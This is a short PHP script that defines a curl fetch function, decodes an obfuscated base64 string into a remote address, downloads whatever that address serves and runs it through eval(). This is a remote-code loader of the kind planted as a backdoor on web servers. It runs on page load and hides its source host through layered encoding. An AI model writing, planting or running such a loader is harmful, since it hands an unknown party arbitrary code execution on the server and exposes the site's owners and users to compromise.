<?pHp 
   function get($url) { 
    $ch = curl_init(); 
 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
 
    $data = curl_exec($ch); 
    curl_close($ch); 
 
    return $data; 
} 
$x= '?>'; 
      eval($x . get(base64_decode('VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OT1ZtUlhZVWR3YTFadE9UVlphMUpEWVVaT1IxZHVRbUZTYldoUVdXdGtUMlJHVW5WWGJXeHBZa1Z3ZWxkWE1ERlZiVkpYWVROc1VGZEdTazVVVldSVFlqRnNkRTFXWkd4aVZrcElWa2N4TkdFeVNsZFhha1pWVWtWd1RGbFZXbkpsVjFKSVpFZHNUbUZ0ZHpGV1JWcHFaVWRPU0ZOdVVtaE5NWEJ4V1d4YVlXUkdhM3BoZWxacFRWaENXVlZ0TVRCaGJWWlZZa1JDV0ZadFVucGFSbFkwVG14S1dWWnRjRk5OYldkNg=='))); 
?>
